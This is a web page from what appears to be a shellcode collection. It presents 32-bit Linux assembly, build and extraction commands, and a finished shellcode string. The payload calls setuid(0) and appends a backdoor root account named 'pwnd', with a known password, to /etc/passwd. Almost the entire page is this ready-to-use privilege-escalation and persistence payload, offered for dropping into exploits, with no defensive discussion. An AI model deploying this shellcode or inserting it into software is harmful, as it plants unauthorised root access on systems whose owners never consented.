---
layout: default
title: Set UID to 0 and add new root user to /etc/passwd with password
permalink: /shellcode/asm-07.html
os: Linux
arch: Intel x86
length: 112
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
; x86 Intel Linux Assembly
; Writes new user 'pwnd' to /etc/passwd with the password '1a2b3c4d'
; Generate hash with perl: perl -le 'print crypt("1a2b3c4d", "root")'
; Line to write: 'pwnd:roXZRtEhJnId2:0:0::/root:/bin/bash\n'

section .text
global _start

_start:
	xor ebx, ebx		; null ebx (0)
	mul ebx			; mul ebx (eax, ebx, edx = 0)
	mov al, 0x17		; move setuid syscall number into al (eax)
	int 0x80		; call setuid

	mov al, 0x05		; move open syscall number into al (eax)
	push ebx		; push null terminator
	push 0x64777373		; push "sswd"
	push 0x61702f63		; push "c/pa"
	push 0x74652f2f		; push "//et"
	mov ebx, esp		; move pointer to "//etc/passwd" into ebx
	mov cx, 0x401		; move 0x401 into cx (APPEND | WRITE ONLY)
	int 0x80		; call open

	mov ebx, eax		; move file-descriptor from eax into ebx
	xor ecx, ecx		; null ecx (0)

	push ecx		; push null terminator
	push 0x0a687361		; push "ash\n"
	push 0x622f6e69		; push "in/b"
	push 0x622f3a74		; push "t:/b"
	push 0x6f6f722f		; push "/roo"
	push 0x3a3a303a		; push ":0::"
	push 0x303a3264		; push "d2:0"
	push 0x496e4a68		; push "hJnI"
	push 0x4574525a		; push "ZRtE"
	push 0x586f723a		; push ":roX"
	push 0x646e7770		; push "pwnd"
	mov ecx, esp		; move pointer to new user string into ecx

	xor eax, eax		; null eax (0)
	mov al, 0x04		; move write syscall number into al (eax)
	mov dl, 40		; move 40 (40 bytes) into dl
	int 0x80		; call write

	xor eax, eax		; null eax (0)
	mov al, 0x06		; move close syscall number into al (eax)
	int 0x80		; call close

	xor ebx, ebx		; null ebx (0)
	mul ebx			; eax, ebx, edx = 0
	inc eax			; increment eax = 1 (exit syscall number)
	int 0x80		; call exit
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf -o code.o code.asm

# Link
ld -m elf_i386 -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xdb\xf7\xe3\xb0\x17\xcd\x80\xb0\x05\x53\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\x01\x04\xcd\x80\x89\xc3\x31\xc9\x51\x68\x61\x73\x68\x0a\x68\x69\x6e\x2f\x62\x68\x74\x3a\x2f\x62\x68\x2f\x72\x6f\x6f\x68\x3a\x30\x3a\x3a\x68\x64\x32\x3a\x30\x68\x68\x4a\x6e\x49\x68\x5a\x52\x74\x45\x68\x3a\x72\x6f\x58\x68\x70\x77\x6e\x64\x89\xe1\x31\xc0\xb0\x04\xb2\x28\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xdb\xf7\xe3\x40\xcd\x80
```